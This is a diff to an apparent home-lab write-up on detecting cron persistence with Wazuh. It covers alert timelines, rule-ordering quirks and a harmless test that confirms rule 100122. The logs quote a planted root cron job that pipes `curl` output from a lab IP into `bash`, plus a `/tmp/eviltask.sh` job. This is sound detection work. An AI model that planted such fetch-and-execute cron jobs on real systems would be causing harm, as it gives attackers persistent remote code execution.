@@ -114,13 +114,28 @@ Run by the admin through sudo, about 01:25 UTC:
 | 01:25:53 | **100121 L13** | same file **modified**. The diff with the appended `/tmp/beacon … base64` line is what matched |
 | 01:25:53 | **100120 L10** | `/var/spool/cron/crontabs/root` **added**: root's first crontab, so no diff and no 100121, even though it contains `/tmp/eviltask.sh` |
 | 01:25:5x | 2833 L8 | `crontab: (root) REPLACE (root)` |
-| 01:26:01, 01:27:01, 01:28:01 | _not alerted (rule rewritten afterwards)_ | `CRON: (root) CMD (curl -s http://192.168.64.1/p \| bash)` and `CMD (/tmp/eviltask.sh)` in archives: **both planted jobs ran** every minute until cleanup. The rewritten 100122 alerts on exactly these lines |
+| 01:26:01, 01:27:01, 01:28:01 | _not alerted (rule rewritten afterwards, then confirmed live: see below)_ | `CRON: (root) CMD (curl -s http://192.168.64.1/p \| bash)` and `CMD (/tmp/eviltask.sh)` in archives: **both planted jobs ran** every minute until cleanup. The rewritten 100122 alerts on exactly these lines |
 
 **Timeline:** planted at 01:25:53, detected the same second (FIM), first executed at 01:26:01. Detection came before execution, but only by seconds, so for cron persistence the response is "remove the job and check what it ran", not "block it first".
 
 **Why 100123 didn't fire:** 100123 and built-in 2833 are both children of 2832. For `(root) REPLACE (root)` Wazuh checks 2833 first (built-in rules load before local ones) and stops at the first child that matches. So the alert is 2833 (level 8, the same as 100123), and 100123 only adds the case 2833 misses: root replacing **another user's** crontab, `(root) REPLACE (labuser)` (logtest: 100123 L8).
 
 **Gap shown by step 3:** a first-ever crontab (or any brand-new cron file) gets 100120 but no content check. The content shows up only when the job runs, which is now 100122.
+
+### 100122 confirmed live, 2026-11-10
+
+A harmless job, `* * * * * root /tmp/soc-lab-noop`, was written to `/etc/cron.d/soc-lab-noop` with `sudo tee`. `/tmp/soc-lab-noop` doesn't exist, so nothing ran, but cron still logs the `CMD` line.
+
+| Time (UTC) | Alert | What |
+|---|---|---|
+| 03:16:03 | 100120 L10 | `/etc/cron.d/soc-lab-noop` added, process `/usr/bin/tee` |
+| 03:17:03 | **100122 L12** | `CRON[8979]: (root) CMD (/tmp/soc-lab-noop)`: matched `/tmp/` |
+| 03:18:03 | **100122 L12** | `CRON[8996]`: the next minute's run, one alert per run as expected |
+| 03:18:21 | 553 L7 | file deleted by `/usr/bin/rm` (cleanup) |
+
+So the gap left by a new cron file (100120 with no content check) is now closed within a minute: the first run of the job gives 100122 with the command in `full_log`.
+
+Deleting the file gave built-in **553**, not 100120, because 100120 is a child of 550/554 only. Removing a cron file is usually cleanup. An attacker deleting a legitimate job (to stop a backup or a security scan) would appear only as 553 L7. If that matters, add 553 to 100120's `if_sid`, at the cost of an extra L10 for every cleanup.
 
 ## How to verify
 
